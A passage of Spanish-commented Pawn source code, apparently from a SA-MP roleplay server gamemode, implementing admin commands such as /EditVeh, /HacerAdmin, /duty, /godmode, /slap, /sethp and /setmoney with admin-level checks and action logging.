		SendAdminMessage(Aguamarina,string);
 	    VehMaletero[coche] = valor;
		printf(string);
		SaveCar(coche);
		return 1;
	}
	if(strcmp(tmp, "Gas", true) == 0)
	{
        tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, Naranja, "* /EditVeh Gas [Cantidad]");
			return 1;
		}
		new gas = strval(tmp);
	    if(gas < 0 || gas > 100){SendClientMessage(playerid, Rojo, "* La cantidad de combustible debe estar entre 0 y 100."); return 1;}
		CarInfo[coche][cGas] = gas;
		format(string,sizeof(string),"'%s' ha seteado el combustible del vehículo %d a %dL.", GetPlayerNameRP(playerid), coche, gas);
		SendAdminMessage(Aguamarina,string);
		printf(string);
		SaveCar(coche);
		return 1;
	}
	if(strcmp(tmp, "MaxMaletero", true) == 0)
	{
        tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, Naranja, "* /EditVeh MaxMaletero [Cantidad]");
			return 1;
		}
		new maxm = strval(tmp);
		if(maxm < 0 || maxm > 7){SendClientMessage(playerid, Rojo, "* El máximo de slots del maletero debe estar entre 0 y 7."); return 1;}
		CarInfo[coche][cMaxMaletero] = maxm;
		format(string,sizeof(string),"'%s' ha seteado el máximo de slots del maletero del vehículo %d a %d.", GetPlayerNameRP(playerid), coche, maxm);
		SendAdminMessage(Aguamarina,string);
		printf(string);
		SaveCar(coche);
		return 1;
	}
	if(strcmp(tmp, "Pintura", true) == 0)
	{
	    tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, Naranja, "* /EditVeh Pintura [Color1] [Color2]");
			return 1;
		}
		new color1 = strval(tmp);
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, Naranja, "* /EditVeh Pintura [Color1] [Color2]");
			return 1;
		}
		new color2 = strval(tmp);
		ChangeVehicleColor(coche, color1, color2);
		CarInfo[coche][cColor1] = color1;
		CarInfo[coche][cColor2] = color2;
		format(string,sizeof(string),"'%s' ha cambiado los colores del vehículo %d a (%d %d).", GetPlayerNameRP(playerid), coche, color1, color2);
		SendAdminMessage(Aguamarina,string);
		printf(string);
		SaveCar(coche);
		return 1;
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/Haceradmin", true) == 0) //Hacer admin
{
    tmp = strtok(cmdtext, idx);
    if(PlayerInfo[playerid][pAdmin] < 5 || !IsPlayerAdmin(playerid)){SendClientMessage(playerid, Rojo, "* No puedes usar este comando."); return 1;}
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /HacerAdmin [ID] [Nivel 1-4]");
        return 1;
    }
    new level;
    playerid2 = ReturnUser(tmp);
    tmp = strtok(cmdtext, idx);
    level = strval(tmp);
    if(PlayerInfo[playerid][pAdmin] >= 5)
    {
        if(IsPlayerConnected(playerid2))
        {
            if(playerid2 != INVALID_PLAYER_ID)
            {
	            format(Nombre2, sizeof(Nombre2),"%s", GetPlayerNameRP(playerid2));
	            format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
	            PlayerInfo[playerid2][pAdmin] = level;
	            printf("'%s´ promovió a %s´ para el nivel %d de admin.", Nombre, Nombre2, level);
	            format(string, sizeof(string), "Fuiste promovido al nivel de admin %d por '%s'.", level, Nombre);
	            SendClientMessage(playerid2, Verde, string);
	            format(string, sizeof(string), "Promoviste a '%s' para el nivel %d de admin.", Nombre2,level);
	            SendClientMessage(playerid, Blanco, string);
            }
        }
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/adminhelp", true) == 0 || strcmp(cmd, "/ah", true) == 0) //Ayuda admin
{
    if(PlayerInfo[playerid][pAdmin] < 1) { SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    new pagina;
    if(PlayerInfo[playerid][pAdmin] >= 5) pagina = 5;
    else pagina = PlayerInfo[playerid][pAdmin];
    switch(pagina)
    {
	    case 1:
	    {
            SendClientMessage(playerid, Aguamarina, "Comandos de ayudante");
            SendClientMessage(playerid, Blanco, "/duty - /slap - /ajail - /desbug - /kick - /mark - /gotomark - /go - /gotopos");
			SendClientMessage(playerid, Blanco, "/goto - /get - /setint - /setvw - /(con)gelar - /(descon)gelar - /godmode - /nogodmode - /volar");
			SendClientMessage(playerid, Blanco, "/(adm)inistracion - /(a)dmin - /norte - /sur - /este - /oeste - /arriba - /abajo - /jetpack");
			SendClientMessage(playerid, Blanco, "/recon - /reconoff - /check - /checkinv - /color - /darropa - /nombreadmin - /gotoconce");
			SendClientMessage(playerid, Blanco, "/gotocasa - /getcasaid - /gotonego - /getnegoid - /gotocar - /gotocarllave - /listaobjetos");
	    }
	    case 2:
	    {
		    SendClientMessage(playerid, Aguamarina, "Comandos de administrador menor");
            SendClientMessage(playerid, Blanco, "/duty - /slap - /ajail - /desbug - /kick - /mark - /gotomark - /go - /gotopos");
			SendClientMessage(playerid, Blanco, "/goto - /get - /setint - /setvw - /(con)gelar - /(descon)gelar - /godmode - /nogodmode - /volar");
			SendClientMessage(playerid, Blanco, "/(adm)inistracion - /(a)dmin - /norte - /sur - /este - /oeste - /arriba - /abajo - /jetpack");
			SendClientMessage(playerid, Blanco, "/recon - /reconoff - /check - /checkinv - /color - /darropa - /nombreadmin - /gotoconce");
			SendClientMessage(playerid, Blanco, "/gotocasa - /getcasaid - /gotonego - /getnegoid - /gotocar - /gotocarllave - /listaobjetos");
			SendClientMessage(playerid, Blanco, "/ban - /bloquear - /advertir - /sethp - /setarmour - /limpiarchat - /fixveh - /repararveh - /repararmotor");
			SendClientMessage(playerid, Blanco, "/respawncoche (o /rc) - /getcar - /getcarllave - /amotor - /acurar");
		}
		case 3:
		{
		    SendClientMessage(playerid, Aguamarina, "Comandos de administrador mediano");
		    SendClientMessage(playerid, Blanco, "/duty - /slap - /ajail - /desbug - /kick - /mark - /gotomark - /go - /gotopos");
			SendClientMessage(playerid, Blanco, "/goto - /get - /setint - /setvw - /(con)gelar - /(descon)gelar - /godmode - /nogodmode - /volar");
			SendClientMessage(playerid, Blanco, "/(adm)inistracion - /(a)dmin - /norte - /sur - /este - /oeste - /arriba - /abajo - /jetpack");
			SendClientMessage(playerid, Blanco, "/recon - /reconoff - /check - /checkinv - /color - /darropa - /nombreadmin - /gotoconce");
			SendClientMessage(playerid, Blanco, "/gotocasa - /getcasaid - /gotonego - /getnegoid - /gotocar - /gotocarllave - /listaobjetos");
			SendClientMessage(playerid, Blanco, "/ban - /bloquear - /advertir - /sethp - /setarmour - /limpiarchat - /fixveh - /repararveh - /repararmotor");
			SendClientMessage(playerid, Blanco, "/desban - /desbanip - /respawncoche (o /rc) - /getcar - /getcarllave - /amotor - /acurar");
			SendClientMessage(playerid, Blanco, "/hacerlider - /hacermiembro - /darrango - /forzarfaccion - /darpuntorol - /quitarpuntorol");
		}
		case 4:
		{
		    SendClientMessage(playerid, Aguamarina, "Comandos de administrador mayor");
		    SendClientMessage(playerid, Blanco, "/duty - /slap - /ajail - /desbug - /kick - /mark - /gotomark - /go - /gotopos");
			SendClientMessage(playerid, Blanco, "/goto - /get - /setint - /setvw - /(con)gelar - /(descon)gelar - /godmode - /nogodmode - /volar");
			SendClientMessage(playerid, Blanco, "/(adm)inistracion - /(a)dmin - /norte - /sur - /este - /oeste - /arriba - /abajo - /jetpack");
			SendClientMessage(playerid, Blanco, "/recon - /reconoff - /check - /checkinv - /color - /darropa - /nombreadmin - /gotoconce");
			SendClientMessage(playerid, Blanco, "/gotocasa - /getcasaid - /gotonego - /getnegoid - /gotocar - /gotocarllave - /listaobjetos");
			SendClientMessage(playerid, Blanco, "/ban - /bloquear - /advertir - /sethp - /setarmour - /limpiarchat - /fixveh - /repararveh - /repararmotor");
			SendClientMessage(playerid, Blanco, "/desban - /desbanip - /respawncoche (o /rc) - /getcar - /getcarllave - /amotor - /acurar");
			SendClientMessage(playerid, Blanco, "/hacerlider - /hacermiembro - /darrango - /forzarfaccion - /darpuntorol - /quitarpuntorol");
			SendClientMessage(playerid, Blanco, "/setmoney - /givemoney - /payday - /crearobjeto - /ahora - /editcasa - /editnego - /cambiarnombre");
			SendClientMessage(playerid, Blanco, "/edittaller - /editveh - /editfacc - /listafaccs - /editturf - /ahora - /tiempo - /setstat - /darmision");
		}
		case 5:
		{
		    SendClientMessage(playerid, Aguamarina, "Comandos de administrador dueño");
		    SendClientMessage(playerid, Blanco, "/duty - /slap - /ajail - /desbug - /kick - /mark - /gotomark - /go - /gotopos");
			SendClientMessage(playerid, Blanco, "/goto - /get - /setint - /setvw - /(con)gelar - /(descon)gelar - /godmode - /nogodmode - /volar");
			SendClientMessage(playerid, Blanco, "/(adm)inistracion - /(a)dmin - /norte - /sur - /este - /oeste - /arriba - /abajo - /jetpack");
			SendClientMessage(playerid, Blanco, "/recon - /reconoff - /check - /checkinv - /color - /darropa - /nombreadmin - /gotoconce");
			SendClientMessage(playerid, Blanco, "/gotocasa - /getcasaid - /gotonego - /getnegoid - /gotocar - /gotocarllave - /listaobjetos");
			SendClientMessage(playerid, Blanco, "/ban - /bloquear - /advertir - /sethp - /setarmour - /limpiarchat - /fixveh - /repararveh - /repararmotor");
			SendClientMessage(playerid, Blanco, "/desban - /desbanip - /respawncoche (o /rc) - /getcar - /getcarllave - /amotor - /acurar");
			SendClientMessage(playerid, Blanco, "/hacerlider - /hacermiembro - /darrango - /forzarfaccion - /darpuntorol - /quitarpuntorol");
			SendClientMessage(playerid, Blanco, "/setmoney - /givemoney - /payday - /crearobjeto - /ahora - /editcasa - /editnego - /cambiarnombre");
			SendClientMessage(playerid, Blanco, "/edittaller - /editveh - /editfacc - /listafaccs - /editturf - /ahora - /tiempo - /setstat - /darmision");
			SendClientMessage(playerid, Blanco, "/crearcuenta - /restart - /haceradmin");
		}
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/duty", true) == 0) //Ponerse o quitarse de servicio admin
{
    if(IsPlayerConnected(playerid))
    {
        if(PlayerInfo[playerid][pAdmin] < 1) { SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
        if(AdminDuty[playerid] == 0)
        {
            format(string, sizeof(string), "[ADMIN]%s", PlayerInfo[playerid][pAdminNombre]);
			SetPlayerName(playerid, string);
			AdminDuty[playerid] = 1;
			SetPlayerSkin(playerid, 0);
			GetPlayerHealth(playerid,PlayerInfo[playerid][pVida]);
	        GetPlayerArmour(playerid,PlayerInfo[playerid][pChaleco]);
            SetPlayerHealth(playerid, 999999);
            SetPlayerArmour(playerid, 999999);
            GodMode[playerid] = 1;
            SetPlayerAttachedObject(playerid, 7, 18749, 1, 0.188027, 0.166383, 0.084972, 12.469782, 90.404510, 174.805938, 0.354661, 1.431730, 0.314013);
            printf("%s se ha puesto de servicio.", GetPlayerNameRP(playerid));
			return 1;
        }
        else if(AdminDuty[playerid] == 1)
        {
			format(string, sizeof(string), "%s", PlayerInfo[playerid][pNombre]);
			SetPlayerName(playerid, string);
            GodMode[playerid] = 0;
            SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
            SetPlayerColor(playerid, Blanco2);
			AdminDuty[playerid] = 0;
            SetPlayerArmour(playerid, PlayerInfo[playerid][pChaleco]);
            SetPlayerHealth(playerid, PlayerInfo[playerid][pVida]);
			RemovePlayerAttachedObject(playerid, 7);
			printf("%s deja de estar de servicio.", GetPlayerNameRP(playerid));
			PonerUniformeFaccion(playerid);
			return 1;
        }
    }
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/ahora", true) == 0) //Cambiar la hora del servidor
{
	if(PlayerInfo[playerid][pAdmin] < 4) { SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
		SendClientMessage(playerid, Naranja, "* /AHora [Horas]");
		return 1;
	}
	ahora = strval(tmp);
	new hora, minuto, segundo;
	gettime(hora, minuto, segundo);
	SetPlayerTime(playerid, hora+ahora, minuto);
	SetWorldTime(hora+ahora);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/tiempo", true) == 0) //Cambiar el tiempo del servidor
{
	if(PlayerInfo[playerid][pAdmin] < 4) { SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
		SendClientMessage(playerid, Naranja, "* /Tiempo [TiempoID]");
		return 1;
	}
	new tiempo = strval(tmp);
	SetPlayerWeather(playerid, tiempo);
	SetWeather(tiempo);
	DefaultWeather = tiempo;
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/gotoconce", true) == 0) //Ir a un concesionario
{
	if(PlayerInfo[playerid][pAdmin] < 1) { SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
		SendClientMessage(playerid, Naranja, "* /Gotoconce [IDConcesionario]");
		return 1;
	}
	new conce = strval(tmp);
	SetPlayerPos(playerid, Concesionarios[conce][cX], Concesionarios[conce][cY], Concesionarios[conce][cZ]);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/amotor", true) == 0) //Encender un vehiculo por admin
{
	if(PlayerInfo[playerid][pAdmin] < 2) { SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER){SendClientMessage(playerid, Rojo, "* No estás en un vehículo como conductor."); return 1;}
	if(AdminDuty[playerid] != 1){SendClientMessage(playerid, Rojo ,"* Ponte duty primero."); return 1;}
	new car = GetPlayerVehicleID(playerid);
	new engine,lights,alarm,doors,bonnet,boot,objective;
    GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
    SetVehicleParamsEx(car,1,lights,alarm,doors,bonnet,boot,objective);
    SendClientMessage(playerid, AzulClaro, "Motor encendido.");
    format(string, sizeof(string), "'%s' ha encendido el motor del vehículo %d.", GetPlayerNameRP(playerid), car);
    SendAdminMessage(Aguamarina, string);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/restart", true) == 0) //Hace un restart del servidor
{
    if(PlayerInfo[playerid][pAdmin] < 5){return 1;}
	SendClientMessageToAll(Amarillo, "Se va a realizar un restart del servidor.");
	SendClientMessageToAll(Amarillo, "Has sido desconectado para guardar tus stats. Vuelve a entrar en unos minutos por favor.");
	for(new i = 0; i < MAX_PLAYERS; i++) //Guarda stats al reiniciar o cerrar el GM
	{
		KickL(i);
	}
	SetTimer("RestartServidor",2000,0); //Reiniciar en 2 segundos
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/nombreadmin", true) == 0) //Cambiar el nick admin
{
    if(PlayerInfo[playerid][pAdmin] < 1) { SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    new length = strlen(cmdtext);
    while ((idx < length) && (cmdtext[idx] <= ' '))
    {
        idx++;
    }
    new offset = idx;
    new result[16];
    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
    {
        result[idx - offset] = cmdtext[idx];
        idx++;
    }
    result[idx - offset] = EOS;
    if(!strlen(result))
    {
        SendClientMessage(playerid, Naranja, "* /NombreAdmin [Nick]");
        SendClientMessage(playerid, Naranja, "Nota: Solo puedes usar letras y números.");
        return 1;
    }
    if(SetPlayerName(playerid, (result)) == -1)
	{
	    SendClientMessage(playerid, Rojo, "* No puedes usar este nick.");
	    return 1;
	}
	SetPlayerName(playerid, PlayerInfo[playerid][pNombre]);
    format(PlayerInfo[playerid][pAdminNombre], sizeof((result)), (result));
	format(string, sizeof(string), "Nick de admin cambiado a '%s'.", (result));
	SendClientMessage(playerid, AzulClaro, string);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/color", true) == 0) //Cambiar el color del nombre
{
    if(PlayerInfo[playerid][pAdmin] < 1) { SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    if(AdminDuty[playerid] != 1){SendClientMessage(playerid, Rojo ,"* Ponte duty primero."); return 1;}
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
	    SendClientMessage(playerid, Naranja, "* /Color [Opción]");
        SendClientMessage(playerid, Naranja, "0 Normal,  1 Rojo,  2 Amarillo, 3 Verde, 4 Naranja");
        SendClientMessage(playerid, Naranja, "5 Violeta, 6 Marron, 7 AzulClaro, 8 Rosa, 9 Aguamarina");
        SendClientMessage(playerid, Naranja, "Nota: Esto te hará visible en el mapa.");
		return 1;
    }
    new item = strval(tmp);
    switch(item)
    {
		case 0: SetPlayerColor(playerid, Blanco2);
		case 1: SetPlayerColor(playerid, RojoIntenso);
		case 2: SetPlayerColor(playerid, Amarillo);
		case 3: SetPlayerColor(playerid, Verde);
		case 4: SetPlayerColor(playerid, Naranja);
		case 5: SetPlayerColor(playerid, Violeta);
		case 6: SetPlayerColor(playerid, Marron);
		case 7: SetPlayerColor(playerid, AzulClaro);
		case 8: SetPlayerColor(playerid, Rosa);
		case 9: SetPlayerColor(playerid, Aguamarina);
		default: SetPlayerColor(playerid, Blanco2);
	}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/crearobjeto", true) == 0) //Crea un objeto (sistema de inventario)
{
    if(PlayerInfo[playerid][pAdmin] < 4) { SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    if(AdminDuty[playerid] != 1){SendClientMessage(playerid, Rojo ,"* Ponte duty primero."); return 1;}
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
	    SendClientMessage(playerid, Naranja, "* /Crearobjeto [ObjetoID] [Cantidad]");
		return 1;
    }
    new item = strval(tmp);
    if(item <= 0){SendClientMessage(playerid, Rojo, "* La ID del objeto no puede ser nula o negativa."); return 1;}
    if(!strlen(ObjetoInfo[item][NombreObjeto])){SendClientMessage(playerid, Rojo, "* No existe un objeto con esa ID."); return 1;}
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
	    SendClientMessage(playerid, Naranja, "* /Crearobjeto [ObjetoID] [Cantidad]");
		return 1;
    }
    new cant = strval(tmp);
    if(cant <= 0){SendClientMessage(playerid, Rojo, "* La cantidad no puede ser nula o negativa."); return 1;}
    if(PlayerInfo[playerid][pManoDer] > 0 && PlayerInfo[playerid][pManoIzq] > 0){SendClientMessage(playerid, Rojo, "* Debes tener una mano vacía."); return 1;}
    if(PlayerInfo[playerid][pManoDer] == 0)
    {
	    PlayerInfo[playerid][pManoDer] = item;
	    PlayerInfo[playerid][pManoDerCant] = cant;
	    PonerObjeto(playerid, 1, item);
	    if(ObjetoInfo[item][IDArma] > 0){GivePlayerWeapon(playerid, ObjetoInfo[item][IDArma], cant);}
    }
    else if(PlayerInfo[playerid][pManoDer] != 0)
    {
        PlayerInfo[playerid][pManoIzq] = item;
	    PlayerInfo[playerid][pManoIzqCant] = cant;
	    PonerObjeto(playerid, 2, item);
    }
    format(string, sizeof(string), "Objeto %s (%d) Cantidad: %d creado.", ObjetoInfo[item][NombreObjeto], item, cant);
    SendClientMessage(playerid, AzulClaro, string);
    format(string, sizeof(string), "'%s' ha creado un/a %s (%d) Cantidad: %d", GetPlayerNameRP(playerid), ObjetoInfo[item][NombreObjeto], item, cant);
    printf(string);
    SendAdminMessage(Aguamarina, string);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/nogodmode", true) == 0) //Desactivar godmode
{
    if(PlayerInfo[playerid][pAdmin] >= 1)
    {
        GodMode[playerid] = 0;
        SendClientMessage(playerid, AzulClaro, "Godmode desactivado.");
        SetPlayerHealth(playerid, 100);
        SetPlayerArmour(playerid, 0);
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/godmode", true) == 0) //Activar godmode
{
	if(PlayerInfo[playerid][pAdmin] < 1) {SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    if(AdminDuty[playerid] == 1)
    {
        SetPlayerHealth(playerid, 999999);
        SetPlayerArmour(playerid, 999999);
        GodMode[playerid] = 1;
        SendClientMessage(playerid, AzulClaro ,"Godmode activado.");
    }
    else
    {
        SendClientMessage(playerid, Rojo ,"* Ponte duty primero.");
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/limpiarchat", true) == 0) //Limpia el chat general
{
    if(PlayerInfo[playerid][pAdmin] < 2){ SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
	for(new i; i < MAX_PLAYERS; i++)
	{
		LimpiarChat(i, 100);
		SendClientMessage(i, AzulClaro, "Un administrador ha limpiado el chat.");
	}
	printf("%s ha limpiado el chat general de todos los jugadores.", GetPlayerNameRP(playerid));
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/check", true) == 0) //Inspecciona los stats de un jugador
{
    if(PlayerInfo[playerid][pAdmin] < 1){ SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    tmp = strtok(cmdtext, idx);
   	if(!strlen(tmp))
    {
	    SendClientMessage(playerid, Naranja, "* /Check [ID]");
	    return 1;
	}
    playerid2 = ReturnUser(tmp);
    if(IsPlayerConnected(playerid2) && playerid2 != INVALID_PLAYER_ID)
    {
		ShowStats(AzulClaro, playerid, playerid2);
	}
	else
	{
        SendClientMessage(playerid,Rojo,"* ID inválida.");
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/checkinv", true) == 0) //Inspecciona el inventario de un jugador
{
    if(PlayerInfo[playerid][pAdmin] < 1){ SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    tmp = strtok(cmdtext, idx);
   	if(!strlen(tmp))
    {
	    SendClientMessage(playerid, Naranja, "* /CheckInv [ID]");
	    return 1;
	}
    playerid2 = ReturnUser(tmp);
    if(IsPlayerConnected(playerid2) && playerid2 != INVALID_PLAYER_ID)
    {
        format(string, sizeof(string), "Objetos de %s:", GetPlayerNameRP(playerid2));
        SendClientMessage(playerid, Amarillo, string);
        format(string, sizeof(string), "Mano derecha: %s (Cant: %d)", ObjetoInfo[PlayerInfo[playerid2][pManoDer]][NombreObjeto], PlayerInfo[playerid2][pManoDerCant]);
		SendClientMessage(playerid, Blanco, string);
		format(string, sizeof(string), "Mano izquierda: %s (Cant: %d)", ObjetoInfo[PlayerInfo[playerid2][pManoIzq]][NombreObjeto], PlayerInfo[playerid2][pManoIzqCant]);
		SendClientMessage(playerid, Blanco, string);
		if(PlayerInfo[playerid2][pServicioPD] == 0)
		{
			for(new x=0; x<8; x++)
			{
			    format(string, sizeof(string), "Bol #%d: %s (Cant: %d)", x+1, ObjetoInfo[PlayerInfo[playerid2][pBol][x]][NombreObjeto], PlayerInfo[playerid2][pBolCant][x]);
			    SendClientMessage(playerid, Blanco, string);
			}
		}
		else
		{
		    for(new x=0; x<8; x++)
			{
			    format(string, sizeof(string), "Cint #%d: %s (Cant: %d)", x+1, ObjetoInfo[PlayerInfo[playerid2][pCint][x]][NombreObjeto], PlayerInfo[playerid2][pCintCant][x]);
			    SendClientMessage(playerid, Blanco, string);
			}
		}
	}
	else
	{
        SendClientMessage(playerid,Rojo,"* ID inválida.");
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/slap", true) == 0) //Dar hostias a los jugadores
{
    if(PlayerInfo[playerid][pAdmin] < 1){ SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    tmp = strtok(cmdtext, idx);
   	if(!strlen(tmp))
    {
	    SendClientMessage(playerid, Naranja, "* /Slap [ID] [Razón]");
	    return 1;
	}
    playerid2 = ReturnUser(tmp);
    if(IsPlayerConnected(playerid2) && playerid2 != INVALID_PLAYER_ID)
    {
        new length = strlen(cmdtext);
        while ((idx < length) && (cmdtext[idx] <= ' '))
	    {
	        idx++;
	    }
	    new offset = idx;
	    new result[128];
	    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
	    {
	        result[idx - offset] = cmdtext[idx];
    	    idx++;
    	}
    	result[idx - offset] = EOS;
    	if(!strlen(result))
    	{
	        SendClientMessage(playerid, Naranja, "* /Slap [ID] [Razón]");
			return 1;
	    }
        new Float:Health;
	    new Float:x, Float:y, Float:z;
		GetPlayerHealth(playerid2,Health);
		SetPlayerHealth(playerid2,Health-10);
		GetPlayerPos(playerid2,x,y,z);
		SetPlayerPos(playerid2,x,y,z+5);
		PlayerPlaySound(playerid,1190,0.0,0.0,0.0);
		PlayerPlaySound(playerid2,1190,0.0,0.0,0.0);
		format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
		format(Nombre2, sizeof(Nombre2),"%s", GetPlayerNameRP(playerid2));
		format(string,sizeof(string),"Has sido abofeteado por '%s'. Motivo: %s", Nombre, (result));
		SendClientMessage(playerid2,AzulClaro,string);
		format(string,sizeof(string),"Has abofeteado a '%s'. Motivo: %s", Nombre2, (result));
		SendClientMessage(playerid,AzulClaro,string);
	}
	else
	{
        SendClientMessage(playerid,Rojo,"* ID inválida.");
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/sethp", true) == 0) //Setear vida
{
    if(PlayerInfo[playerid][pAdmin] < 2){ SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    tmp = strtok(cmdtext, idx);
   	if(!strlen(tmp))
    {
	    SendClientMessage(playerid, Naranja, "* /Sethp [ID] [Cantidad]");
	    return 1;
	}
    playerid2 = ReturnUser(tmp);
    if(IsPlayerConnected(playerid2) && playerid2 != INVALID_PLAYER_ID)
    {
        tmp = strtok(cmdtext, idx);
    	if(!IsNumeric(tmp) || !strlen(tmp))
    	{
	        SendClientMessage(playerid, Naranja, "* /Sethp [ID] [Cantidad]");
			return 1;
	    }
        new Health = strval(tmp);
		SetPlayerHealth(playerid2,Health);
		format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
		format(Nombre2, sizeof(Nombre2),"%s", GetPlayerNameRP(playerid2));
		format(string,sizeof(string),"'%s' ha seteado tu vida a %d.", Nombre, Health);
		SendClientMessage(playerid2,AzulClaro,string);
		format(string,sizeof(string),"Has seteado la vida de '%s' a %d.", Nombre2, Health);
		SendClientMessage(playerid,AzulClaro,string);
		format(string,sizeof(string),"'%s' ha seteado la vida de '%s' a %d.", Nombre, Nombre2, Health);
		SendAdminMessage(Aguamarina,string);
		printf(string);
	}
	else
	{
        SendClientMessage(playerid,Rojo,"* ID inválida.");
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/setarmour", true) == 0) //Setear armadura
{
    if(PlayerInfo[playerid][pAdmin] < 2){ SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    tmp = strtok(cmdtext, idx);
   	if(!strlen(tmp))
    {
	    SendClientMessage(playerid, Naranja, "* /Setarmour [ID] [Cantidad]");
	    return 1;
	}
    playerid2 = ReturnUser(tmp);
    if(IsPlayerConnected(playerid2) && playerid2 != INVALID_PLAYER_ID)
    {
        tmp = strtok(cmdtext, idx);
    	if(!IsNumeric(tmp) || !strlen(tmp))
    	{
	        SendClientMessage(playerid, Naranja, "* /Setarmour [ID] [Cantidad]");
			return 1;
	    }
        new Armour = strval(tmp);
		SetPlayerArmour(playerid2,Armour);
		format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
		format(Nombre2, sizeof(Nombre2),"%s", GetPlayerNameRP(playerid2));
		format(string,sizeof(string),"'%s' ha seteado tu armadura a %d.", Nombre, Armour);
		SendClientMessage(playerid2,AzulClaro,string);
		format(string,sizeof(string),"Has seteado la armadura de '%s' a %d.", Nombre2, Armour);
		SendClientMessage(playerid,AzulClaro,string);
		format(string,sizeof(string),"'%s' ha seteado la armadura de '%s' a %d.", Nombre, Nombre2, Armour);
		SendAdminMessage(Aguamarina,string);
		printf(string);
	}
	else
	{
        SendClientMessage(playerid,Rojo,"* ID inválida.");
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/setmoney", true) == 0) //Setear dinero
{
    if(PlayerInfo[playerid][pAdmin] < 4){ SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    tmp = strtok(cmdtext, idx);
   	if(!strlen(tmp))
    {
	    SendClientMessage(playerid, Naranja, "* /Setmoney [ID] [Cantidad]");
	    return 1;
	}
    playerid2 = ReturnUser(tmp);
    if(IsPlayerConnected(playerid2) && playerid2 != INVALID_PLAYER_ID)
    {
        tmp = strtok(cmdtext, idx);
    	if(!IsNumeric(tmp) || !strlen(tmp))
    	{
	        SendClientMessage(playerid, Naranja, "* /Setmoney [ID] [Cantidad]");
			return 1;
	    }
        new Dinero = strval(tmp);
        ResetPlayerMoneyAC(playerid2);
		GivePlayerMoneyAC(playerid2,Dinero);
		format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
		format(Nombre2, sizeof(Nombre2),"%s", GetPlayerNameRP(playerid2));
		format(string,sizeof(string),"'%s' ha seteado tu dinero a %d$.", Nombre, Dinero);
		SendClientMessage(playerid2,AzulClaro,string);
		format(string,sizeof(string),"Has seteado el dinero de '%s' a %d$.", Nombre2, Dinero);
		SendClientMessage(playerid,AzulClaro,string);
		format(string,sizeof(string),"'%s' ha seteado el dinero de '%s' a %d$.", Nombre, Nombre2, Dinero);
		SendAdminMessage(Aguamarina,string);
		printf(string);
	}
	else
	{
        SendClientMessage(playerid,Rojo,"* ID inválida.");
	}
